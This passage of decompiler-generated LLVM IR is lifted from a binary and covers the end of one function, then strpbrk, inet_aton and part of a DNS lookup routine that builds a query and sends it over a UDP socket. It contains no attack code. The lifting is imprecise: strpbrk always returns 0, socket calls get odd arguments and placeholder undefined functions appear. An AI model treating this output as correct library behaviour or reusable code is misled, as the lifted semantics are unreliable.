  br i1 %v4_1000d8b4, label %dec_label_pc_1000d8c4, label %dec_label_pc_1000d8d4

dec_label_pc_1000d8c4:                            ; preds = %dec_label_pc_1000d8ac
  store i32 268490952, i32* @lr, align 4
  %v4_1000d8c4 = call i32 @rawmemchr(i32 %v0_1000d8b8, i32 0, i32 0)
  %v0_1000d8c8 = load i32, i32* @r31, align 4
  store i32 %v0_1000d8c8, i32* %r0.global-to-local, align 4
  %v1_1000d8cc = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d8cc = inttoptr i32 %v1_1000d8cc to i32*
  store i32 %v4_1000d8c4, i32* %v2_1000d8cc, align 4
  br label %dec_label_pc_1000d8e4

dec_label_pc_1000d8d4:                            ; preds = %dec_label_pc_1000d8ac
  %v1_1000d8b4 = inttoptr i32 %v3_1000d8ac to i8*
  store i8 0, i8* %v1_1000d8b4, align 1
  %v0_1000d8dc = load i32, i32* @r31, align 4
  store i32 %v0_1000d8dc, i32* %r0.global-to-local, align 4
  %v0_1000d8e0 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d8e0 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d8e0 = inttoptr i32 %v1_1000d8e0 to i32*
  store i32 %v0_1000d8e0, i32* %v2_1000d8e0, align 4
  br label %dec_label_pc_1000d8e4

dec_label_pc_1000d8e4:                            ; preds = %dec_label_pc_1000d8c4, %dec_label_pc_1000d8a4, %dec_label_pc_1000d8d4
  %v0_1000d8e4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d860, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d8e4

; uselistorder directives
  uselistorder i32 %v3_1000d8ac, { 2, 0, 1 }
  uselistorder i32 %v2_1000d88c, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000d880, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_1000d8e4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d880, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000d91c1 = load i32, i32* @r3, align 4
  %v1_1000d91c2 = inttoptr i32 %v0_1000d91c1 to i8*
  %v2_1000d91c3 = load i8, i8* %v1_1000d91c2, align 1
  %v3_1000d91c4 = zext i8 %v2_1000d91c3 to i32
  store i32 %v3_1000d91c4, i32* %r11.global-to-local, align 4
  %v3_1000d9206 = icmp eq i8 %v2_1000d91c3, 0
  br i1 %v3_1000d9206, label %dec_label_pc_1000d930, label %dec_label_pc_1000d928

dec_label_pc_1000d900:                            ; preds = %dec_label_pc_1000d904
  %v3_1000d904 = zext i8 %v2_1000d904 to i32
  %v4_1000d910 = icmp eq i32 %v3_1000d904, %v1_1000d910
  %v0_1000d900 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d910, i32 %v0_1000d900)
  %v0_1000d904.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d910.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d904

dec_label_pc_1000d904:                            ; preds = %dec_label_pc_1000d928, %dec_label_pc_1000d900
  %v1_1000d910 = phi i32 [ %v1_1000d9109, %dec_label_pc_1000d928 ], [ %v1_1000d910.pre, %dec_label_pc_1000d900 ]
  %v0_1000d904 = phi i32 [ %tmp, %dec_label_pc_1000d928 ], [ %v0_1000d904.pre, %dec_label_pc_1000d900 ]
  %v1_1000d904 = inttoptr i32 %v0_1000d904 to i8*
  %v2_1000d904 = load i8, i8* %v1_1000d904, align 1
  %v1_1000d908 = add i32 %v0_1000d904, 1
  store i32 %v1_1000d908, i32* %r9.global-to-local, align 4
  %v3_1000d90c = icmp eq i8 %v2_1000d904, 0
  br i1 %v3_1000d90c, label %dec_label_pc_1000d918, label %dec_label_pc_1000d900

dec_label_pc_1000d918:                            ; preds = %dec_label_pc_1000d904
  %v0_1000d918 = load i32, i32* @r3, align 4
  %v1_1000d918 = add i32 %v0_1000d918, 1
  store i32 %v1_1000d918, i32* @r3, align 4
  %v1_1000d91c = inttoptr i32 %v1_1000d918 to i8*
  %v2_1000d91c = load i8, i8* %v1_1000d91c, align 1
  %v3_1000d91c = zext i8 %v2_1000d91c to i32
  store i32 %v3_1000d91c, i32* %r11.global-to-local, align 4
  %v3_1000d920 = icmp eq i8 %v2_1000d91c, 0
  br i1 %v3_1000d920, label %dec_label_pc_1000d930, label %dec_label_pc_1000d928

dec_label_pc_1000d928:                            ; preds = %entry, %dec_label_pc_1000d918
  %v1_1000d9109 = phi i32 [ %v3_1000d91c, %dec_label_pc_1000d918 ], [ %v3_1000d91c4, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d904

dec_label_pc_1000d930:                            ; preds = %dec_label_pc_1000d918, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000d904, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d928, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_1000d938 = icmp eq i8* %arg1, null
  br i1 %v3_1000d938, label %dec_label_pc_1000d9f0, label %dec_label_pc_1000d940

dec_label_pc_1000d940:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1000d954.pre = load i32, i32* @global_var_100249f0, align 4
  br label %dec_label_pc_1000d950

dec_label_pc_1000d950:                            ; preds = %dec_label_pc_1000d940, %dec_label_pc_1000d9c8
  %v0_1000d9c8 = phi i32 [ 0, %dec_label_pc_1000d940 ], [ %v2_1000d9d0, %dec_label_pc_1000d9c8 ]
  %v0_1000d9cc = phi i32 [ 1, %dec_label_pc_1000d940 ], [ %v1_1000d9cc, %dec_label_pc_1000d9c8 ]
  %v0_1000d950 = phi i32 [ %tmp, %dec_label_pc_1000d940 ], [ %v0_1000d9503, %dec_label_pc_1000d9c8 ]
  %v1_1000d950 = inttoptr i32 %v0_1000d950 to i8*
  %v2_1000d950 = load i8, i8* %v1_1000d950, align 1
  %v3_1000d950 = zext i8 %v2_1000d950 to i32
  %v1_1000d958 = mul nuw nsw i32 %v3_1000d950, 2
  %v2_1000d95c = add i32 %v1_1000d958, %v3_1000d954.pre
  %v3_1000d95c = inttoptr i32 %v2_1000d95c to i16*
  %v4_1000d95c = load i16, i16* %v3_1000d95c, align 2
  %v1_1000d960 = and i16 %v4_1000d95c, 8
  %v3_1000d960 = icmp eq i16 %v1_1000d960, 0
  br i1 %v3_1000d960, label %dec_label_pc_1000d9f0, label %dec_label_pc_1000d968

dec_label_pc_1000d968:                            ; preds = %dec_label_pc_1000d950
  br label %dec_label_pc_1000d980

dec_label_pc_1000d970:                            ; preds = %dec_label_pc_1000d980
  %v1_1000d984 = mul i32 %v1_1000d9d0, 10
  %v2_1000d98c = add i32 %v3_1000d980, %v1_1000d984
  %v1_1000d970 = add i32 %v2_1000d98c, -48
  %v1_1000d974 = add i32 %v0_1000d9b8, 1
  %v2_1000d978 = icmp sgt i32 %v1_1000d970, 255
  br i1 %v2_1000d978, label %dec_label_pc_1000d9f0, label %dec_label_pc_1000d980

dec_label_pc_1000d980:                            ; preds = %dec_label_pc_1000d970, %dec_label_pc_1000d968
  %v1_1000d9d0 = phi i32 [ %v1_1000d970, %dec_label_pc_1000d970 ], [ 0, %dec_label_pc_1000d968 ]
  %v0_1000d9b8 = phi i32 [ %v1_1000d974, %dec_label_pc_1000d970 ], [ %v0_1000d950, %dec_label_pc_1000d968 ]
  %v1_1000d980 = inttoptr i32 %v0_1000d9b8 to i8*
  %v2_1000d980 = load i8, i8* %v1_1000d980, align 1
  %v3_1000d980 = zext i8 %v2_1000d980 to i32
  %v1_1000d988 = mul nuw nsw i32 %v3_1000d980, 2
  %v2_1000d990 = add i32 %v1_1000d988, %v3_1000d954.pre
  %v3_1000d990 = inttoptr i32 %v2_1000d990 to i16*
  %v4_1000d990 = load i16, i16* %v3_1000d990, align 2
  %v5_1000d990 = zext i16 %v4_1000d990 to i32
  %v1_1000d994 = and i32 %v5_1000d990, 8
  %v3_1000d994 = icmp eq i32 %v1_1000d994, 0
  br i1 %v3_1000d994, label %dec_label_pc_1000d99c, label %dec_label_pc_1000d970

dec_label_pc_1000d99c:                            ; preds = %dec_label_pc_1000d980
  %v2_1000d99c = icmp sgt i32 %v0_1000d9cc, 3
  br i1 %v2_1000d99c, label %dec_label_pc_1000d9b4, label %dec_label_pc_1000d9a4

dec_label_pc_1000d9a4:                            ; preds = %dec_label_pc_1000d99c
  %v3_1000d9a4 = icmp eq i8 %v2_1000d980, 46
  br i1 %v3_1000d9a4, label %dec_label_pc_1000d9ac, label %dec_label_pc_1000d9f0

dec_label_pc_1000d9ac:                            ; preds = %dec_label_pc_1000d9a4
  %v1_1000d9ac = add i32 %v0_1000d9b8, 1
  br label %dec_label_pc_1000d9c8

dec_label_pc_1000d9b4:                            ; preds = %dec_label_pc_1000d99c
  %v3_1000d9b4 = icmp eq i8 %v2_1000d980, 0
  %v1_1000d9b8 = add i32 %v0_1000d9b8, 1
  br i1 %v3_1000d9b4, label %dec_label_pc_1000d9c8, label %dec_label_pc_1000d9c0

dec_label_pc_1000d9c0:                            ; preds = %dec_label_pc_1000d9b4
  %v1_1000d9c0 = and i32 %v5_1000d990, 32
  %v3_1000d9c0 = icmp eq i32 %v1_1000d9c0, 0
  br i1 %v3_1000d9c0, label %dec_label_pc_1000d9f0, label %dec_label_pc_1000d9c8

dec_label_pc_1000d9c8:                            ; preds = %dec_label_pc_1000d9c0, %dec_label_pc_1000d9b4, %dec_label_pc_1000d9ac
  %v0_1000d9503 = phi i32 [ %v1_1000d9b8, %dec_label_pc_1000d9c0 ], [ %v1_1000d9b8, %dec_label_pc_1000d9b4 ], [ %v1_1000d9ac, %dec_label_pc_1000d9ac ]
  %v1_1000d9c8 = mul i32 %v0_1000d9c8, 256
  %v1_1000d9cc = add nuw nsw i32 %v0_1000d9cc, 1
  %v2_1000d9d0 = or i32 %v1_1000d9d0, %v1_1000d9c8
  store i32 %v2_1000d9d0, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1000d9cc, 5
  br i1 %tmp10, label %dec_label_pc_1000d950, label %dec_label_pc_1000d9dc

dec_label_pc_1000d9dc:                            ; preds = %dec_label_pc_1000d9c8
  %v0_1000d9dc = load i32, i32* @r4, align 4
  %v3_1000d9dc = icmp eq i32 %v0_1000d9dc, 0
  %v0_1000d9e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d9dc, i32 %v0_1000d9e4)
  %v0_1000d9e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d9e8 = load i32, i32* @r4, align 4
  %v2_1000d9e8 = inttoptr i32 %v1_1000d9e8 to i32*
  store i32 %v0_1000d9e8, i32* %v2_1000d9e8, align 4
  ret i32 1

dec_label_pc_1000d9f0:                            ; preds = %dec_label_pc_1000d9a4, %dec_label_pc_1000d9c0, %dec_label_pc_1000d950, %dec_label_pc_1000d970, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000d9d0, { 1, 0 }
  uselistorder i32 %v1_1000d9cc, { 1, 0 }
  uselistorder i32 %v0_1000d9b8, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000d9f0, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000d950, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_1000d9fc = load i32, i32* @lr, align 4
  store i32 %v0_1000d9fc, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268491304, i32* @lr, align 4
  %v0_1000da24 = call i32 @malloc()
  store i32 %v0_1000da24, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268491316, i32* @lr, align 4
  %v0_1000da30 = call i32 @malloc()
  %v0_1000da34 = load i32, i32* @r30, align 4
  %v3_1000da34 = icmp eq i32 %v0_1000da34, 0
  store i32 %v0_1000da30, i32* @r21, align 4
  br i1 %v3_1000da34, label %dec_label_pc_1000dff0, label %dec_label_pc_1000da40

dec_label_pc_1000da40:                            ; preds = %entry
  %v3_1000da40 = icmp eq i32 %v0_1000da30, 0
  br i1 %v3_1000da40, label %dec_label_pc_1000dff0, label %dec_label_pc_1000da48

dec_label_pc_1000da48:                            ; preds = %dec_label_pc_1000da40
  %v0_1000da48 = load i32, i32* @r23, align 4
  %v3_1000da48 = icmp eq i32 %v0_1000da48, 0
  br i1 %v3_1000da48, label %dec_label_pc_1000dff0, label %dec_label_pc_1000da50

dec_label_pc_1000da50:                            ; preds = %dec_label_pc_1000da48
  %v0_1000da50 = load i32, i32* %r14.global-to-local, align 4
  %v1_1000da50 = inttoptr i32 %v0_1000da50 to i8*
  %v2_1000da50 = load i8, i8* %v1_1000da50, align 1
  %v3_1000da50 = zext i8 %v2_1000da50 to i32
  store i32 %v3_1000da50, i32* %r0.global-to-local, align 4
  %v3_1000da54 = icmp eq i8 %v2_1000da50, 0
  br i1 %v3_1000da54, label %dec_label_pc_1000dff0, label %dec_label_pc_1000da5c

dec_label_pc_1000da5c:                            ; preds = %dec_label_pc_1000da50
  store i32 %v0_1000da50, i32* @r3, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  %v0_1000da64 = call i32 @__GI_strlen()
  %v0_1000da6c = load i32, i32* %r14.global-to-local, align 4
  %v2_1000da6c = add i32 %v0_1000da6c, %v0_1000da64
  %v1_1000da74 = add i32 %v2_1000da6c, -1
  %v2_1000da74 = inttoptr i32 %v1_1000da74 to i8*
  %v3_1000da74 = load i8, i8* %v2_1000da74, align 1
  %v4_1000da74 = zext i8 %v3_1000da74 to i32
  store i32 %v4_1000da74, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002acd0.651 to i32), i32* %r29.global-to-local, align 4
  %v2_1000da7c = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_1000da7c, i32* %r28.global-to-local, align 4
  store i32 %v2_1000da7c, i32* @r3, align 4
  %v1_1000da88 = xor i32 %v4_1000da74, 46
  store i32 %v1_1000da88, i32* %r17.global-to-local, align 4
  %v0_1000da8c = call i32 @__pthread_return_void()
  %v0_1000da94 = call i32 @__pthread_return_0()
  %v3_1000da9c = load i32, i32* @global_var_10024a90.652, align 4
  store i32 %v3_1000da9c, i32* %r11.global-to-local, align 4
  %v3_1000daa8 = load i16, i16* @global_var_100249ac.653, align 2
  %v4_1000daa8 = zext i16 %v3_1000daa8 to i32
  store i32 %v4_1000daa8, i32* @r25, align 4
  %v1_1000daac = load i32, i32* @r23, align 4
  store i32 %v2_1000da7c, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_1000daac = srem i32 %v3_1000da9c, %v1_1000daac
  %v2_1000dac8 = sub i32 %v3_1000da9c, %v2_1000daac
  store i32 %v2_1000dac8, i32* %r0.global-to-local, align 4
  store i32 %v2_1000daac, i32* @r26, align 4
  %v0_1000dad0 = call i32 @__pthread_return_void()
  %v0_1000dfe4.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_1000dfe4.pr19, 3
  br i1 %tmp57, label %dec_label_pc_1000dad8.lr.ph.lr.ph, label %dec_label_pc_1000dffc

dec_label_pc_1000dad8.lr.ph.lr.ph:                ; preds = %dec_label_pc_1000da5c
  %v2_1000daf0 = ptrtoint i32* %stack_var_-144 to i32
  %v2_1000dc04 = ptrtoint i32* %stack_var_-204 to i32
  %v2_1000dc64 = ptrtoint i16* %stack_var_-212 to i32
  %v2_1000dca8 = ptrtoint i32* %stack_var_-248 to i32
  %v3_1000dd04 = icmp eq i32 %tmp37, 0
  %v3_1000dd10 = icmp eq i32 %tmp36, 3
  %v2_1000dd8c = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1000dde0 = ptrtoint i32* %stack_var_-184 to i32
  %v3_1000de0c = icmp eq i32 %tmp33, 0
  %v3_1000dd80 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_1000dad8.lr.ph

dec_label_pc_1000dad8:                            ; preds = %dec_label_pc_1000dad8.lr.ph, %dec_label_pc_1000dc88
  %v0_1000dad8 = load i32, i32* @r19, align 4
  %v3_1000dad8 = icmp eq i32 %v0_1000dad8, -1
  br i1 %v3_1000dad8, label %dec_label_pc_1000dae8, label %dec_label_pc_1000dae0

dec_label_pc_1000dae0:                            ; preds = %dec_label_pc_1000dad8
  store i32 268491496, i32* @lr, align 4
  %v1_1000dae4 = call i32 @__libc_close(i32 %v0_1000dad8)
  br label %dec_label_pc_1000dae8

dec_label_pc_1000dae8:                            ; preds = %dec_label_pc_1000dad8, %dec_label_pc_1000dae0
  store i32 %v2_1000daf0, i32* %r29.global-to-local, align 4
  %v0_1000daf4 = load i32, i32* @r30, align 4
  store i32 268491516, i32* @lr, align 4
  %v3_1000daf8 = call i32 @__GI_memset(i32 %v0_1000daf4, i32 0, i32 512)
  store i32 268491532, i32* @lr, align 4
  %v3_1000db08 = call i32 @__GI_memset(i32 %v2_1000daf0, i32 0, i32 48)
  %v0_1000db0c = load i32, i32* @r25, align 4
  %v1_1000db0c = add i32 %v0_1000db0c, 1
  %v1_1000db10 = urem i32 %v1_1000db0c, 65536
  store i32 %v1_1000db10, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000db1c = load i32, i32* @r30, align 4
  store i32 %v1_1000db10, i32* %stack_var_-144, align 4
  %v4_1000db30 = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_1000db1c, i32 512)
  store i32 %v4_1000db30, i32* %r28.global-to-local, align 4
  %v1_1000db34 = icmp slt i32 %v4_1000db30, 0
  br i1 %v1_1000db34, label %dec_label_pc_1000dffc, label %dec_label_pc_1000db3c

dec_label_pc_1000db3c:                            ; preds = %dec_label_pc_1000dae8
  %v0_1000db3c = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_1000db3c, i32* @r4, align 4
  %v0_1000db44 = load i32, i32* @r21, align 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268491600, i32* @lr, align 4
  %v4_1000db4c = call i32 @strncpy(i32 %v0_1000db44, i32 %v0_1000db3c, i32 1025)
  store i32 ptrtoint (i32* @global_var_100249b0.604 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000da7c, i32* @r3, align 4
  %v0_1000db64 = call i32 @__pthread_return_void()
  %v0_1000db6c = call i32 @__pthread_return_0()
  %v0_1000db70 = load i32, i32* @r22, align 4
  %v1_1000db70 = icmp slt i32 %v0_1000db70, 0
  %v0_1000db78 = load i32, i32* @r26, align 4
  %v1_1000db78 = mul i32 %v0_1000db78, 4
  store i32 %v1_1000db78, i32* %r0.global-to-local, align 4
  %v2_1000db7c = add i32 %v1_1000db78, %arg4
  %v3_1000db7c = inttoptr i32 %v2_1000db7c to i32*
  %v4_1000db7c = load i32, i32* %v3_1000db7c, align 4
  store i32 %v4_1000db7c, i32* %r29.global-to-local, align 4
  br i1 %v1_1000db70, label %dec_label_pc_1000dbc4, label %dec_label_pc_1000db84

dec_label_pc_1000db84:                            ; preds = %dec_label_pc_1000db3c
  %v3_1000db88 = load i32, i32* @global_var_10024a98.655, align 4
  store i32 %v3_1000db88, i32* %r0.global-to-local, align 4
  %v2_1000db8c = icmp slt i32 %v0_1000db70, %v3_1000db88
  br i1 %v2_1000db8c, label %dec_label_pc_1000db94, label %dec_label_pc_1000dbc4

dec_label_pc_1000db94:                            ; preds = %dec_label_pc_1000db84
  store i32 ptrtoint (i32* @global_var_100138f0.656 to i32), i32* @r4, align 4
  %v0_1000dba0 = load i32, i32* @r21, align 4
  store i32 268491688, i32* @lr, align 4
  %v4_1000dba4 = inttoptr i32 %v0_1000dba0 to i8*
  %v5_1000dba4 = call i32 @__GI_strncat(i8* %v4_1000dba4, i32 ptrtoint (i32* @global_var_100138f0.656 to i32), i32 1025, i32 268566528)
  %v0_1000dbac = load i32, i32* @r22, align 4
  %v1_1000dbac = mul i32 %v0_1000dbac, 4
  store i32 %v1_1000dbac, i32* %r0.global-to-local, align 4
  %v2_1000dbb4 = add i32 %v1_1000dbac, ptrtoint (i32* @global_var_1002ad80.657 to i32)
  %v3_1000dbb4 = inttoptr i32 %v2_1000dbb4 to i32*
  %v4_1000dbb4 = load i32, i32* %v3_1000dbb4, align 4
  store i32 %v4_1000dbb4, i32* @r4, align 4
  %v0_1000dbb8 = load i32, i32* @r21, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000dbc4.658 to i32), i32* @lr, align 4
  %v4_1000dbc0 = inttoptr i32 %v0_1000dbb8 to i8*
  %v5_1000dbc0 = call i32 @__GI_strncat(i8* %v4_1000dbc0, i32 %v4_1000dbb4, i32 1025, i32 ptrtoint (i32* @global_var_1002ad80.657 to i32))
  br label %dec_label_pc_1000dbc4

dec_label_pc_1000dbc4:                            ; preds = %dec_label_pc_1000db84, %dec_label_pc_1000db3c, %dec_label_pc_1000db94
  store i32 %v2_1000da7c, i32* @r3, align 4
  %v0_1000dbcc = call i32 @__pthread_return_void()
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000dbd8 = load i32, i32* @r30, align 4
  %v1_1000dbd8 = load i32, i32* %r28.global-to-local, align 4
  %v2_1000dbd8 = add i32 %v1_1000dbd8, %v0_1000dbd8
  %v1_1000dbdc = sub i32 512, %v1_1000dbd8
  %v0_1000dbe4 = load i32, i32* @r21, align 4
  store i32 %v0_1000dbe4, i32* %stack_var_-240, align 4
  store i32 268491760, i32* @lr, align 4
  %v4_1000dbec = call i32 @__encode_question(i32* nonnull %stack_var_-240, i32 %v2_1000dbd8, i32 %v1_1000dbdc)
  store i32 %v4_1000dbec, i32* @r27, align 4
  %v1_1000dbf0 = icmp slt i32 %v4_1000dbec, 0
  br i1 %v1_1000dbf0, label %dec_label_pc_1000dffc, label %dec_label_pc_1000dbf8

dec_label_pc_1000dbf8:                            ; preds = %dec_label_pc_1000dbc4
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1000dc00 = load i32, i32* @r29, align 4
  store i16 2, i16* %stack_var_-212, align 2
  store i32 268491792, i32* @lr, align 4
  %v3_1000dc0c = inttoptr i32 %v0_1000dc00 to i8*
  %v4_1000dc0c = call i32 @inet_pton(i32 10, i8* %v3_1000dc0c, i32 %v2_1000dc04)
  %tmp59 = icmp slt i32 %v4_1000dc0c, 1
  br i1 %tmp59, label %dec_label_pc_1000dc20thread-pre-split, label %dec_label_pc_1000dc18

dec_label_pc_1000dc18:                            ; preds = %dec_label_pc_1000dbf8
  store i32 10, i32* %r0.global-to-local, align 4
  store i16 10, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000dc20

dec_label_pc_1000dc20thread-pre-split:            ; preds = %dec_label_pc_1000dbf8
  %v3_1000dc20.pr = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000dc20

dec_label_pc_1000dc20:                            ; preds = %dec_label_pc_1000dc20thread-pre-split, %dec_label_pc_1000dc18
  %v3_1000dc20 = phi i16 [ %v3_1000dc20.pr, %dec_label_pc_1000dc20thread-pre-split ], [ 10, %dec_label_pc_1000dc18 ]
  %v3_1000dc24 = icmp eq i16 %v3_1000dc20, 10
  store i32 53, i32* %r0.global-to-local, align 4
  br i1 %v3_1000dc24, label %dec_label_pc_1000dc4c, label %dec_label_pc_1000dc38

dec_label_pc_1000dc38:                            ; preds = %dec_label_pc_1000dc20
  %v0_1000dc3c = load i32, i32* @r29, align 4
  store i32 268491848, i32* @lr, align 4
  %v1_1000dc44 = call i32 @inet_addr(i32 %v0_1000dc3c)
  %v3_1000dc4c.pre = load i16, i16* %stack_var_-212, align 2
  br label %dec_label_pc_1000dc4c

dec_label_pc_1000dc4c:                            ; preds = %dec_label_pc_1000dc20, %dec_label_pc_1000dc38
  %v3_1000dc4c = phi i16 [ 10, %dec_label_pc_1000dc20 ], [ %v3_1000dc4c.pre, %dec_label_pc_1000dc38 ]
  %v4_1000dc4c = sext i16 %v3_1000dc4c to i32
  store i32 268491868, i32* @lr, align 4
  %v3_1000dc58 = call i32 @socket(i32 %v4_1000dc4c, i32 2, i32 17)
  store i32 %v3_1000dc58, i32* @r19, align 4
  %v1_1000dc5c = icmp slt i32 %v3_1000dc58, 0
  br i1 %v1_1000dc5c, label %dec_label_pc_1000dc88, label %dec_label_pc_1000dc64

dec_label_pc_1000dc64:                            ; preds = %dec_label_pc_1000dc4c
  store i32 268491888, i32* @lr, align 4
  %v3_1000dc6c = call i32 @__libc_connect(i32 %v2_1000dc64, i32 28, i32 28)
  %tmp60 = icmp sgt i32 %v3_1000dc6c, -1
  br i1 %tmp60, label %dec_label_pc_1000dc90, label %dec_label_pc_1000dc78

dec_label_pc_1000dc78:                            ; preds = %dec_label_pc_1000dc64
  %v0_1000dc78 = call i32 @__errno_location()
  %v1_1000dc7c = inttoptr i32 %v0_1000dc78 to i32*
  %v2_1000dc7c = load i32, i32* %v1_1000dc7c, align 4
  store i32 %v2_1000dc7c, i32* %r0.global-to-local, align 4
  %v3_1000dc80 = icmp eq i32 %v2_1000dc7c, 101
  br i1 %v3_1000dc80, label %dec_label_pc_1000dfc8, label %dec_label_pc_1000dc88

dec_label_pc_1000dc88:                            ; preds = %dec_label_pc_1000dc78, %dec_label_pc_1000dc4c
  %v0_1000dc88 = load i32, i32* %r18.global-to-local, align 4
  %v1_1000dc88 = add i32 %v0_1000dc88, 1
  store i32 %v1_1000dc88, i32* %r18.global-to-local, align 4
  %tmp61 = icmp ult i32 %v1_1000dc88, 3
  br i1 %tmp61, label %dec_label_pc_1000dad8, label %dec_label_pc_1000dffc

dec_label_pc_1000dc90:                            ; preds = %dec_label_pc_1000dc64
  %v0_1000dc90 = load i32, i32* @r28, align 4
  %v1_1000dc90 = load i32, i32* @r27, align 4
  %v2_1000dc90 = add i32 %v1_1000dc90, %v0_1000dc90
  %v0_1000dc94 = load i32, i32* @r30, align 4
  %v0_1000dc9c = load i32, i32* @r19, align 4
  store i32 ptrtoint (i32* @global_var_1000dca4.660 to i32), i32* @lr, align 4
  %v4_1000dca0 = call i32 @__libc_send(i32 %v0_1000dc9c, i32 %v0_1000dc94, i32 %v2_1000dc90, i32 0)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000dcb8 = load i32, i32* @r19, align 4
  store i32 %v0_1000dcb8, i32* %stack_var_-248, align 4
  store i32 268491968, i32* @lr, align 4
  %v3_1000dcbc = call i32 @__libc_poll(i32 %v2_1000dca8, i32 1, i32 10000)
  %tmp62 = icmp slt i32 %v3_1000dcbc, 1
  br i1 %tmp62, label %dec_label_pc_1000dfc8, label %dec_label_pc_1000dcc8

dec_label_pc_1000dcc8:                            ; preds = %dec_label_pc_1000dc90
  %v0_1000dcc8 = load i32, i32* @r19, align 4
  %v0_1000dccc = load i32, i32* @r30, align 4
  store i32 268491996, i32* @lr, align 4
  %v4_1000dcd8 = call i32 @__libc_recv(i32 %v0_1000dcc8, i32 %v0_1000dccc, i32 512, i32 0)
  store i32 %v4_1000dcd8, i32* @r27, align 4
  %tmp63 = icmp slt i32 %v4_1000dcd8, 12
  br i1 %tmp63, label %dec_label_pc_1000df70, label %dec_label_pc_1000dce8

dec_label_pc_1000dce8:                            ; preds = %dec_label_pc_1000dcc8
  %v0_1000dce8 = load i32, i32* @r30, align 4
  %v2_1000dcf0 = inttoptr i32 %v0_1000dce8 to i8*
  %v3_1000dcf0 = call i32 @__decode_header(i8* %v2_1000dcf0, i32 %v2_1000daf0)
  %v3_1000dcf4 = load i32, i32* %stack_var_-144, align 4
  store i32 %v3_1000dcf4, i32* @r20, align 4
  %v1_1000dcf8 = load i32, i32* @r25, align 4
  %v4_1000dcf8 = icmp eq i32 %v3_1000dcf4, %v1_1000dcf8
